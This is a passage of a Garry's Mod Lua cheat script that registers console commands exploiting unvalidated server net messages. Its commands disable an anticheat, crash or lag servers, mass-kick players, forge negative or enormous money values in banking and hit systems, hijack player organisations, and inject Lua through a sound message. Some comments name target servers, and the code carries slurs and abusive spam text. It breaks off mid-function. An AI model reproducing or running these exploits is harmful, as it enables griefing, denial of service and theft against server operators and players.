                    RunConsoleCommand("sc_exploit_remove_Specified", "prop_physics")
                    RunConsoleCommand("sc_exploit_remove_Specified", "gmod_lamp")
                    RunConsoleCommand("sc_exploit_remove_Specified", "gmod_emitter")
                    RunConsoleCommand("sc_exploit_remove_Specified", "npc_")
                    end)
                
                spamremovelp = true
            end
        end
        sce_AddCommand("exploit_remove_spam_IgnoreMe", sce_SpamRemoveIgnore, "Shinycow's Exploit: Spam remove every entity except yours.")
        
        -- TODO
        local function sce_NoCollide( p, c, args )
            if args[1] then
                if string.find(string.lower(args[1]), "props") or string.find(string.lower(args[1]), "prop_physics") then
                    exploitCollisions( nil, "off", false, "prop_physics" )
                    
                    return
                end
            end
            
            if IsValid(LocalPlayer():GetEyeTrace().Entity) then
                exploitCollisions( LocalPlayer():GetEyeTrace().Entity, "off", true )
            end
        end
        sce_AddCommand("exploit_collide_Off", sce_NoCollide, "Shinycow's Exploit: Nocollide what you want bby.")
        
        local function sce_Collide( p, c)
            for k,v in pairs(ents.GetAll()) do
                exploitCollisions( v, "on", true )
            end
        end
        sce_AddCommand("exploit_collide_On", sce_Collide, "Shinycow's Exploit: Collide everything.")
        
        local function sce_misc_TAC()
            if RunCheck then
                function RunCheck()
                    print("nty TAC.")
                end
                LocalPlayer():ChatPrint("The shitty 'Tyler's Anti Cheat', has been patched.")
            else
                LocalPlayer():ChatPrint("Could not find Tyler's Anti Cheat.")
            end
        end
        sce_AddCommand("exploit_misc_TAC", sce_misc_TAC, "Shinycow's Exploit: Removes Tyler's Anti Cheat function.")
        
        -- DOESNT BELONG HERE:
        
/*local ps_text =
{
"Shinycow was here.",
"TEAM 1338",
"Shinycow was here.",
"Shinycow is above all.",
"Shinycow is above all.",
"Shinycow likes weiners.",
"420swagYOLO1337ERRYDAY",
"TEAM 1338",
"Shinycow was here.",
"420haxsmokeweedLOLXD"
}
local sce_spam_PS = false
local function sce_misc_PS()
        if not PS then LocalPlayer():ChatPrint("PointShop is not running!") return end
 
        if sce_spam_PS then
                timer.Destroy("lmaoPS")
                sce_spam_PS = false
        else
                timer.Create("lmaoPS", 0.5, 0, function()
                        net.Start('PS_ModifyItem')
                                net.WriteString("texthat")
                                net.WriteTable(
                                {
                                text = ps_text[math.random(#ps_text)],
                                color = { r = math.random(90,200), b = math.random(50,255), a = 255, g = math.random(50, 255) }
                                }
                                )
                        net.SendToServer()
                end)
               
                sce_spam_PS = true
        end
end
sce_AddCommand("misc_PS", sce_misc_PS, "Shinycow's Exploit: Quickly change pointshop text hat text.")*/

local sce_toggle_Crash = false
local function sce_misc_CrashPropkill()
        --if gmod.GetGamemode().Name != "Propkill v2.6" then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
        if not PK and not PK.HudSettings then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
        
        if sce_toggle_Crash then
            hook.Remove("CreateMove", "lmaoPK")
            sce_toggle_Crash = false
        else
            hook.Add("CreateMove", "lmaoPK", function()
                RunConsoleCommand("ulx","addcustomspawn","battler")
                end)
            sce_toggle_Crash = true
        end
    end
    sce_AddCommand("exploit_misc_PK", sce_misc_CrashPropkill, "Shinycow's Exploit: Toggle crashing Propkill v2.6.")
    
    
    local function sce_misc_CrashPropkillSlower()
        --if gmod.GetGamemode().Name != "Propkill v2.6" and gmod.GetGamemode().Name != "Propkill v1337" then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
        if not PK and not PK.HudSettings then LocalPlayer():ChatPrint("Propkill v2.6 is not running!") return end
        
        timer.Create("lmaoPK", 1.4, 0, function()
            RunConsoleCommand("ulx","addcustomspawn","battler")
            end)
    end
    sce_AddCommand("exploit_misc_PK2", sce_misc_CrashPropkillSlower, "ohai")
    
    
        -- Disables the stunstick flash from getting beaten in DarkRP.
        hook.Add("Initialize", "scexploit_misc_DarkRPStunstick", function()
            usermessage.Hook("StunStickFlash", function() end)
            usermessage.Hook("ulx_blind", function() end)
            end)
        
        
------------------------------------- MENU ----------------------------------------

                -- Shittily made menu.
                local function SCE_ShowConfigMenu()
                    local exploitmenu = vgui.Create("DFrame")
                    exploitmenu:SetPos( (ScrW() * 0.5) - 100, (ScrH() * 0.5) - 225 )
                    exploitmenu:SetSize( (ScrW() * 0.5) - 250, (ScrH() * 0.5) - 90 )
                    exploitmenu:SetTitle( "Exploit menu" )
                    exploitmenu:SetVisible( true )
                    exploitmenu:SetDraggable( false )
                    exploitmenu:ShowCloseButton( true )
                    exploitmenu:SetAlpha( 150 )
                    exploitmenu:AlphaTo( 255, 6, 1 )
                    exploitmenu:MakePopup()
                    
                                        -- Design coloring taken from DeathZone :3
                                        function exploitmenu:Paint()
                                            surface.SetDrawColor(Color(64, 64, 64, 255))
                                            surface.DrawRect(0, 0, self:GetWide(), self:GetTall())
                                            surface.SetDrawColor(Color(51, 51, 51, 255))
                                            surface.DrawRect(0, 0, self:GetWide(), 22)
                                        end
                                        
                                        local exploitmenutabs = vgui.Create("DPropertySheet", exploitmenu)
                                        exploitmenutabs:SetPos( 5, 27 )
                                        exploitmenutabs:SetSize( (ScrW() * 0.5) - 260, (ScrH() * 0.5) - 120 )
                                        
                                        local ButtonPanel = vgui.Create("DPanelList", configmenu)
                        --ButtonPanel:SetPos( 25, 25 )
                        ButtonPanel:SetSize( 395, 320 )
                        ButtonPanel:SetSpacing(2)
                        ButtonPanel:EnableHorizontal(false)
                        ButtonPanel:EnableVerticalScrollbar( true )
                        
                        
                        local button1 = vgui.Create("DButton")
                        button1:SetText("Remove names")
                        button1.DoClick = function()
                        RunConsoleCommand("say", "no removing names")
                    end
                    ButtonPanel:AddItem(button1)
                    
                    local button2 = vgui.Create("DButton")
                    button2:SetText("Remove everything")
                    button2.DoClick = function()
                    RunConsoleCommand("say", "no removing everything")
                end
                ButtonPanel:AddItem(button2)
                
                local button3 = vgui.Create("DButton")
                button3:SetText("Remove what you're looking at.")
                button3.DoClick = function()
                RunConsoleCommand("say", "no removing what ur looking at")
            end
            ButtonPanel:AddItem(button3)
            
            
            exploitmenutabs:AddSheet( "Buttons", ButtonPanel, "icon16/bomb.png", false, false )
            
                        --[[local checkbox2 = vgui.Create("DCheckBoxLabel")
                        checkbox2:SetValue(0)
                        checkbox2:SetText("Remove everything")
                        function checkbox2.Button:Toggle()
                                if self:GetChecked() == nil or not self:GetChecked() then
                                        self:SetValue( true )
                                else
                                        self:SetValue( false )
                                end
                        end
                        ConfigPanel:AddItem(checkbox2)]]              
                        
                    end
                    
                    hook.Add("PlayerBindPress", "sce_ConfigMenu", function( pl, bind, b_Pressed )
                        if string.lower(bind) == "impulse 201" then
                            SCE_ShowConfigMenu()
                        end
                        end)
                    
                    
                    
                    
                    
                    
-- 2/15/14 -- lets try something new

sce_AddCommand("exploit_remove_weapons_player", function( pl, cmd, arg )
    if not arg[1] then pl:ChatPrint("supply a player name") return end
    
    local target = FindPlayer(arg[1])
    if not target then print("fuk") return end
    
    for k,v in next, ents.GetAll() do
        if string.find(string.lower(tostring(v)), "weapon") then
            if v:GetPos():Distance( target:GetPos() ) < 55 then
                net.Start("properties")
                net.WriteUInt( util.NetworkStringToID( "remove" ), 32 )
                net.WriteEntity( v )
                net.SendToServer()
            end
        end
    end
    end)




concommand.Add("gethooks", function()
    PrintTable(hook.GetTable())
    end)



--[[print( LocalPlayer():GetEyeTrace().Entity )]]

--[[hook.Add("Think","lolz",function()
        if v != LocalPlayer() then
                if v:IsUserGroup("respected") then
                        net.Start( "DaHit" )
                        net.WriteEntity(v)
                        net.WriteEntity(v)
                        net.WriteEntity(v)
                        net.WriteString( "-100000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 " )
                net.SendToServer()
 
        end
end
end)]]









--[[local hitRequest = {}
 
for k,v in pairs(player.GetAll()) do
        if v != LocalPlayer() then
                if v:IsAdmin() then
                hitRequest.hitman = LocalPlayer()
                hitRequest.requester = me
                hitRequest.target = v
                hitRequest.reward = -1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
end
end
end
 
 
 
        net.Start( 'hhs_request' )
                                net.WriteTable( hitRequest )
                                net.SendToServer()]]
--[[for k,v in pairs(player.GetAll()) do
        if v:Nick() == "I luv u" then
                        net.Start("REPAdminChangeLVL")
                                        net.WriteEntity(v)
                                        net.WriteDouble(10000000000000000000000)
                                net.SendToServer()
                        end
                        end
--[[for k,v in pairs(player.GetAll()) do
        net.Start("REPAdminChangeLVL")
                                        net.WriteEntity(v)
                                        net.WriteDouble(1090000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
                                net.SendToServer()
                                end]]
                                
 --[[   hook.Add("Think","ndf",function()
 
 
                if LocalPlayer():Health() < 99 then
                                net.Start("REPPurchase")
                                net.WriteString("HEALTH")
                                net.SendToServer()
               end
               
               if LocalPlayer():Armor() < 99 then
net.Start("REPPurchase")
                                net.WriteString("ARMOR")
                                net.SendToServer()
 
end
end)]]
                                                --[[net.Start("EZI_GiveItem")
                                                        net.WriteString("1")
                                                        net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
                                                net.SendToServer()
 
 
                                                ]]
--[[hook.Add("Think","ndf",function()
for k,v in pairs(player.GetAll()) do
        if v:IsAdmin() then
        net.Start("RP_Fine_Player")
                net.WriteString(v:Nick())
                net.WriteString(v:Nick())
                net.WriteDouble(1000)
                net.WriteString("This server deserves an anarchy! Free for all! You can suk my ass hoe!")
        net.SendToServer()
end
end
end)]]

--[[hook.Add("Think","ndf",function()
for k,v in pairs(player.GetAll()) do
        if v:Nick() == "I love you!" then
        net.Start("RP_Fine_Player")
                net.WriteString(v:Nick())
                net.WriteString(v:Nick())
                net.WriteDouble(1000)
                net.WriteString("This server deserves an anarchy! Free for all! You can go be a bitch!")
        net.SendToServer()
end
end
end)]]




--[[for k,v in pairs(player.GetAll())do
        if v:Nick() == "MrDozer" then
        net.Start("RP_Accept_Fine")
 net.WriteString(v:Nick())
 net.WriteDouble(-10000000000000000000000000)
net.SendToServer()
end
end]]

        --[[net.Start( "Deposit" )
                net.WriteInt(-100000000, 32)
                net.SendToServer()]]
                --[[    net.Start("BuyUpgradesStuff")
                        net.WriteString("")
                        net.WriteFloat(-100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
                        net.SendToServer()]]
                        concommand.Add("exploit_VCMOD", function()
                            net.Start( "AttemptSellCar" )
                            net.WriteInt( 1, 8 )
                            net.SendToServer()
                            
                            
                            
                            net.Start( "AttemptSellCar" )
                            net.WriteInt( 2, 8 )
                            net.SendToServer()
                            net.Start( "AttemptSellCar" )
                            net.WriteInt( 3, 8 )
                            net.SendToServer()
                            net.Start( "AttemptSellCar" )
                            net.WriteInt( 4, 8 )
                            net.SendToServer()
                            net.Start( "AttemptSellCar" )
                            net.WriteInt( 5, 8 )
                            net.SendToServer()
                            net.Start( "AttemptSellCar" )
                            net.WriteInt( 6, 8 )
                            net.SendToServer()
                            net.Start( "AttemptSellCar" )
                            net.WriteInt( 7, 8 )
                            net.SendToServer()
                            net.Start( "AttemptSellCar" )
                            net.WriteInt( 8, 8 )
                            net.SendToServer()
                            net.Start( "AttemptSellCar" )
                            net.WriteInt( 9, 8 )
                            net.SendToServer()
                            net.Start( "AttemptSellCar" )
                            net.WriteInt( 0, 8 )
                            net.SendToServer()
                            end)
                        
                        
                        
--[[for k,v in pairs(player.GetAll()) do
        if v:Nick() == "I luv u" then
                                net.Start("SquadGiveWeapon")
                        net.WriteString("m9k_minigun")
                        net.WriteEntity(LocalPlayer())
                        net.SendToServer()
 
 
end
end]]

                --[[net.Start("SetTableTarget")
                        net.WriteString("pername")
                        net.WriteString("erjob")
                        net.WriteInt(-10000000000000000000000000000000000000000000000000000000000000000000000000, 32)
                        net.WriteString("hitmansel")
                                net.WriteString("Anony.")
                        net.WriteString("weaponsel")
                       
                                net.WriteFloat(0)
                        net.WriteInt(1, 32)
                        net.SendToServer()]]
--[[hook.Add("Think","ndf",function()
                for k,v in pairs(player.GetAll()) do
                                                net.Start( "SendMail" )
                                                        net.WriteString("IVE GOT LOADDDDDS OF SWAG!!!!!!! SUCK IT BITCH!")
                                                        net.WriteString(v:Nick())
                                                net.SendToServer()
                                print("LOLLOLOLOLOLOLOLOL")
 
end
end)]]
--[[hook.Add("Think","ndf",function()
for k,v in pairs(player.GetAll()) do
        net.Start( "SendMoney" )
                        net.WriteEntity(v)
                        net.WriteEntity(v )
                        net.WriteEntity(v)
                        net.WriteString(-1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
                net.SendToServer()
        end
        end)]]
        --[[    hook.Add("Think","ndf",function()
for k,v in pairs(player.GetAll()) do
                        net.Start("NLR.ActionPlayer")
                                        net.WriteEntity(v)
                                        net.SendToServer()
                                end
                                end)]]
--[[for k,v in pairs(player.GetAll()) do
if v != LocalPlayer() then
                                        net.Start("BTTTStartVotekick")
                                                                        net.Start("_nonDBVMVote")
                                        net.WriteEntity(v)
                                        net.WriteString("")
                                        net.WriteString("1")
                                net.SendToServer()
                                                        end
                                                        end]]
                                                        
                                                        
                                                        
                                                        
                --[[net.Start("DemotePlayer")
                                net.WriteString("Wolf99")  -- demote (RP Name)
                                net.SendToServer()]]
                                
                        --[[net.Start("OpenGates")
                                net.WriteEntity(sweg)   --open any door
                                net.SendToServer()]]
                                
                                        --[[net.Start("VehicleUnderglow") -- toggle underglow
                                        net.SendToServer()]]
                                        
                                        
                --[[net.Start("PoliceJoin") -- Join police
                net.SendToServer() ]]
                
                                --[[net.Start("Resupply")               -- Respawn equipment
        net.SendToServer()
        ]]
        --[[net.Start("NewRPNameSQL")
                        net.WriteString("Hue Janis")  --Change name
                        net.SendToServer()]]
                        
                                --[[net.Start("DropItem")
                                        net.WriteString(item) -- Still experimenting (Possible item dupe)
                                        net.WriteString(1)
                                        net.SendToServer()]]
                                        
        --[[net.Start("UpdateRPUModelSQL")
                        net.WriteString(sweg:GetModel()) -- Model Changer
                net.SendToServer()
 
                print(sweg:GetModel())]]
--[[hook.Add("Think","ndf",function()
for k,v in pairs(player.GetAll()) do
                net.Start("RevivePlayer")
                                                        net.WriteEntity(v)
                                                        net.WriteEntity(v)
                                                net.SendToServer()
end
end)]]
--[[for k,v in pairs(ents.GetAll()) do
        if v:GetClass() == "func_door" then
                if(LocalPlayer():GetPos():Distance(v:GetPos()) < 1000) then
net.Start("OpenGates")
                                net.WriteEntity(v)   --open any door
                        net.SendToServer()
 
end
end
end
net.Start("OpenGates")
                                net.WriteEntity(sweg)   --open any door
                        net.SendToServer()
                        print(sweg:GetClass())
 
 
                        --      net.Start("FiremanLeave") net.SendToServer()]]
--[[hook.Add("Think","ndf",function()
                for k,v in pairs(player.GetAll()) do
if v:Nick() != "I love you!" then
 
net.Start( "GiveWeapon" )
                                                                net.Start( "CreateEntity" )
                                                        net.WriteString( "sent_arc_atm" )
                                                        net.WriteFloat( 100000000000000000000000000000000000000000000000000)
                                                        net.WriteEntity( v)
                                                net.SendToServer()
 
                end
                end
                end)]]
--[[hook.Add("Think","ndf",function()
if tobool(GetConVarNumber("jdance" ) ) then
                for k,v in pairs(player.GetAll() ) do
                        RunConsoleCommand("act", "dance")
end
end
end)]]
--[[hook.Add("Think","ndf",function()
for k,v in pairs(player.GetAll()) do
         if v:Nick() == "I luv u" then
net.Start( "GetCar" )
                net.WriteEntity(v)
                net.WriteEntity(v)
        net.SendToServer()
end
end
end)
 
hook.Add("Think","ndf",function()
for k,v in pairs(player.GetAll()) do
--       if v:Nick() == "I luv u" then
if v:IsAdmin() then
net.Start( "GetCar" )
                net.WriteEntity(v)
                net.WriteEntity(v)
        net.SendToServer()
--end
end
end
end)]]

    --[[ net.Start("Hopping_Test")
                net.WriteString("2 Much swg 4 u")
                net.SendToServer()]]
                
                print("=============ULX (DARKRP AND WHATNOT)============")
                for k,v in pairs(player.GetAll()) do
                    if( v:GetUserGroup() != "user" ) then
                        print(v:Nick().. " | ".. v:GetUserGroup())
                    end
                end
                print("==================================================")
                
                
--[[hook.Add("Think","ndf",function()
 
        net.Start("View_Paper")
 
 
 
for k,v in pairs(player.GetAll()) do
 
if v:IsAdmin() or if v:IsSuperAdmin() then
                                        net.WriteEntity(v)
 
end
end
 
 
 
for k,v in pairs(ents.GetAll()) do
       
if v:GetClass() == "tool_paper" then
 
net.WriteEntity(v)
 
end
end
 
net.SendToServer()]]

--[[for k,v in pairs(player.GetAll()) do
net.Start( "BailOut" )
                                net.WriteEntity( v)
                                net.WriteEntity( v)
                                net.WriteFloat( 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 )
                        net.SendToServer()
 
                        end]]
--[[hook.Add("Think","ndf",function()
        for k,v in pairs(player.GetAll()) do
local tab = {
                REPORTER = v:Nick(),
                REPORTERID = v:SteamID(),
                FAGGOT = v:Nick(),
                FAGGOTID = v:SteamID(),
                INFO = "fag",
                PROOF = "fag"
        }
        net.Start("DLRDM_Start")
        net.WriteTable(tab)
        net.SendToServer()
        net.SendToServer()
end
end)
]]


--[[chat.AddText("Jay has swag")(k)
                        net.SendToServer()
net.Start("DarkRP_spawnPocket")
                                net.WriteFloat
        for k,v in pairs(player.GetAll()) do
net.Start("VoteKickNO")
                net.WriteFloat(v:EntIndex())
                net.WriteFloat(6)
                net.SendToServer()
                net.Start("VoteKickNO")
                net.WriteFloat(v:EntIndex())
                net.WriteFloat(6)
                net.SendToServer()
                net.Start("VoteKickNO")
                net.WriteFloat(v:EntIndex())
                net.WriteFloat(6)
                net.SendToServer()
                net.Start("VoteKickNO")
                net.WriteFloat(v:EntIndex())
                net.WriteFloat(6)
                net.SendToServer()
 
 
net.Start("VoteBanNO")
                net.WriteFloat(v:EntIndex())
                net.WriteFloat(8)
                net.SendToServer()
                net.Start("VoteBanNO")
                net.WriteFloat(v:EntIndex())
                net.WriteFloat(8)
                net.SendToServer()
                net.Start("VoteBanNO")
                net.WriteFloat(v:EntIndex())
                net.WriteFloat(8)
                net.SendToServer()
 
                end]]
                --[[hook.Add("Think","ndf",function()
                for k,v in pairs(player.GetAll()) do
                        if v != LocalPlayer() then
                                if v:Nick() != "I luv u" then
net.Start("CpForm_Answers")
                        net.WriteEntity(v)
                        net.WriteTable({})
                net.SendToServer()
        end
end
end
end)]]

--[[for k,v in pairs(player.GetAll()) do
               
                net.Start( "DepositMoney" )
                        net.WriteEntity(swag)
net.WriteString("-100000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000011000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000010000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000100000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000001000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000000000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000010000000100000001000000000")
                        net.WriteEntity( v)
                net.SendToServer()
 
 
 
end
 
 
 
 
]]



--[[net.Start("ARCLib_Sound") -- Now I know any client can just do lua_run_cl with this, BUT IT'S SO FUCKING USEFUL...
                                net.WriteEntity(swag)
net.WriteString("\",Vector(0,0,0),0,0)RunConsoleCommand(\"say\", \"// shrek is coming\")-- ")
                                net.WriteUInt(75,8)
                                net.WriteUInt(100,8)
                                net.SendToServer()]]
                                
                                
--[[hook.Add("Think","ndf",function()
        for k,v in pairs(player.GetAll())
                if v:Nick() == "I luv u" then
                        net.Start( "GetCar" )
                net.WriteEntity(v)
                net.WriteEntity(v)
        net.SendToServer()
end
end
end)]]


--[[for k,v in pairs(ents.GetAll()) do
        chat.AddText(Color(255,0,0), "GRABBING MONEY!")
net.Start('NGII_TakeMoney')
                        net.WriteEntity( v )
                        net.WriteEntity( LocalPlayer() )
                net.SendToServer()
                end]]
                
                
                
                
                
                function dloglag()
                   
                    print("Lagging server.")
                    
                    print("Lagging server..")
                    
                    print("Lagging server...")
                    timer.Create( "dlogsisfucked", 3, 0, function()
                        for i=0, 700 do
                            local tosend = {
                            cmd="+forward",
                            args=" "
                            
                        }
                        net.Start('dLogsGetCommand')
                        net.WriteTable(tosend)
                        net.SendToServer()
                    end
                    end)
                end
                
                concommand.Add( "exploit_dlogs_lag", dloglag )
                concommand.Add( "exploit_dlogs_lag_off", function()
                   
                  print("Stopping the lag...")
                  timer.Destroy("dlogisfucked")
                  end)
                
                
                
                
                
                
                chat.AddText("shitfunc.lua Enabled from dat.lua.exe")
                
                local sweg = LocalPlayer():GetEyeTrace().Entity
                local me = LocalPlayer()
                
concommand.Add("exploit_orginv_all",function()  --      Invite everyone to your org. Like SaintsRP add this to a bind or spam it in console to prevent you from getting banned.                
    for k,v in pairs(player.GetAll()) do
        net.Start("InviteMember")
        net.WriteEntity(v)
        net.WriteEntity(v)
        net.WriteString("Insert random stuff here")            
        net.SendToServer()
    end
    end)


concommand.Add("exploit_hoopla",function()      -- Hoopla Roleplay copied and pasted HHH and changed the nets. Works on there server. But they set there money limit to 2m.
    local hitRequest = {}
    for k,v in pairs(player.GetAll()) do
        if v != LocalPlayer() then
            if v:IsUserGroup("moderator") then
                hitRequest.hitman = LocalPlayer()
                hitRequest.requester = me
                hitRequest.target = v
                hitRequest.reward = -1000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
                net.Start( 'hhs_request' )
                net.WriteTable( hitRequest )
                net.SendToServer()
            end
        end
    end
    end)

concommand.Add("exploit_hhh",function() -- HHH Exploit. Already leaked and shit. Useless kinda some servers have it.
    local hitRequest = {}
    for k,v in pairs(player.GetAll()) do
        if v != LocalPlayer() then
            if v:IsUserGroup("user") then
                hitRequest.hitman = LocalPlayer()
                hitRequest.requester = me
                hitRequest.target = v
                hitRequest.reward = -10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
                net.Start( 'hhh_request' )
                net.WriteTable( hitRequest )
                net.SendToServer()
            end
        end
    end
    end)





concommand.Add("exploit_terror",function()      -- WOrks on servers with Territorylol                          
    for k,v in pairs(player.GetAll()) do
        net.Start("newTerritory")
        net.WriteString("Banana")
        net.WriteTable(t)
        net.SendToServer()
    end
    end)


concommand.Add("exploit_eastergg",function() -- Servers with CC Custom Commands. Type cc_egg2 for the second one.
    net.Start( "egg" )
    net.SendToServer()
    
    end)
concommand.Add("exploit_orgcreate",function() -- Servers with ORG Use this on SaintsRP it makes someone else leader and you can spam this and stuff and accuse people of doing this exploit
    for k,v in pairs(player.GetAll()) do
        local haha = LocalPlayer():GetEyeTrace().Entity
        net.Start("CreateOrganization")
        net.WriteEntity(haha)
        net.WriteString( "Join my gang or will rekt u" )
        net.SendToServer()
    end
    end)

concommand.Add("exploit_orgdisband",function() -- WORKS ON SAINTS RP WOOO. SERVERS WITH ORG
    net.Start("DisbandOrganization")
    net.WriteEntity(LocalPlayer())
    net.SendToServer()
    end)

concommand.Add("exploit_orgchangename",function() -- Change name on servers with ORG. WOrks on some. WORKS ON SAINTS RP REALLY GOOD
    net.Start("ChangeOrgName")
    net.WriteString("I LOVE BANNAS WOOOOOOOOO I FUCKED GIANT BABIES WOOOOOO")
    net.WriteString("SHITTY CUNT ASS SERVER FUCK OFF. STOP WITH YOUR SHITTY COPY AND PASTE SHIT! YOU STOLE MY SHIT NIGGER!")
    net.WriteEntity(LocalPlayer())
    net.SendToServer()
    end)



concommand.Add("exploit_arcbank",function() --DONT WORK!
    local ARCBank_IsAValidDevice = LocalPlayer():GetEyeTrace().Entity  
    ARCBank_CreateAccount_CallBack(succ,ent)    
    net.Start("arcbank_comm_create")
        net.WriteEntity(ARCBank_IsAValidDevice)--ARCBank_IsAValidDevice
        net.WriteString("Fag")
        net.SendToServer()
        
        
        end)








--[[concommand.Add("exploit_arcbanktest",function() Work on progress for ARCAtm to give myself inf money
net.Start("ARCLib_Sound") -- Now I know any client can just do lua_run_cl with this, BUT IT'S SO FUCKING USEFUL...
                                net.WriteEntity(swag)
net.WriteString("\",Vector(0,0,0),0,0)RunConsoleCommand(\"say\", \"// shrek is coming\")-- ")
                                net.WriteUInt(75,8)
                                net.WriteUInt(100,8)
                                net.SendToServer()
 
 
 
 
for k,v in pairs(ents.GetAll()) do
       
swag = v
 
end
 
 
net.Start("arcbank_comm_lang")
                               
               
 
 
 
 
 
 
net.Start( "DepositMoney" )
                        net.WriteEntity(swag)
net.WriteString("`0")
                        net.WriteEntity( sweg)
                net.SendToServer()
end)
]]
concommand.Add("exploit_bybail",function() -- Exploit on all Byb servers to bail yourself out
    net.Start("Letthisdudeout")
    net.WriteEntity(LocalPlayer())
    net.SendToServer()
    end)   




concommand.Add("exploit_invitereward",function() -- Get reward on servers that have invite your friends addon thing to get prizes.     
    net.Start( "IS_SubmitSID_C2S" )
    net.WriteString("Killa")
    net.SendToServer()
    net.Start( "IS_GetReward_C2S" )
    net.SendToServer()
    
    end)

concommand.Add("exploit_BailOffer",function() -- Random bail thing. Nothing new
    for k,v in pairs(player.GetAll()) do
        net.Start( "AcceptBailOffer" )
        net.WriteEntity(v)
        net.WriteUInt(-100000000000000000, 16 )
        net.SendToServer()
    end
    end)

--[[function itemstore.trading.OpenRequest( id ) Still making this. Itemstore exploit -.=
                local request = vgui.Create( "ItemStoreTradeRequest" )
                request:SetTradeID( id )
                request:SetSize( 250, 100 )
                request:SetPos( ScrW() - request:GetWide(), ScrH() - request:GetTall() )
                request:ShowCloseButton( false )
                request:SetDraggable( false )
                end]]
--[[
        net.Start( "ItemStoreTrade", function()
                local id = net.WriteEntity("32")
               
                local left = {
                        pl = net.WriteEntity(LocalPlayer()),
                        money = net.WriteEntity("999999999999999999999"),
                        cont = net.WriteEntity("9999999999999999999999"),
                        money = net.SendToServer(),
                        money = net.SendToServer(),
                        ready = net.ReadBit() == 1
                }
               
               
                local right = {
                        pl = net.WriteEntity(LocalPlayer()),
                        money = net.WriteEntity("999999999999999999999"),
                        cont = net.WriteEntity("9999999999999999999999"),
                        money = net.SendToServer(),
                        ready = net.ReadBit() == 1
                       
                }
               
                end)]]
                
concommand.Add("exploit_CPBypass",function() -- bypass shitty test and become CP Won't work sometimes
    net.Start("CP_Test_Results")
    net.WriteInt(1 ,8)
    net.SendToServer()
    end)

concommand.Add("exploit_ReSpawn",function() -- Respawn exploit on ThatDarkRPServer
    net.Start("ReSpawn")
    net.SendToServer()
    end)                   




concommand.Add("exploit_DonationBox",function() -- Testing dis shittttt NOT FINISHED!
    if IsValid(box) then
        notification.AddLegacy("Thank you for donating!", NOTIFY_GENERIC, 3)
        surface.PlaySound("buttons/button15.wav")              
        net.Start("donation_box")
        net.WriteEntity(box)
        net.WriteString("99999999999")
        net.WriteFloat(9999999999)
        net.SendToServer()
    end
    end)
concommand.Add("exploit_kickfightclub",function() -- ThatDarkRP Server kicks everyone in dah club
    for k,v in pairs(player.GetAll()) do
        net.Start("FIGHTCLUB_KickPlayer")
        net.WriteBit(v)
        net.WriteEntity(v)
        net.SendToServer()
    end
    end)




concommand.Add("exploit_phone",function() -- RPHONE NOT FINISHED
    for k,v in pairs(player.GetAll()) do
        net.Start( "rphone_phone_dial" )
        net.WriteString(v)
        net.SendToServer()
    end
    end)   




concommand.Add("exploit_jbkickall",function()
    for k,v in pairs(player.GetAll()) do
        net.Start("JB_Votekick")
        net.WriteEntity(v)
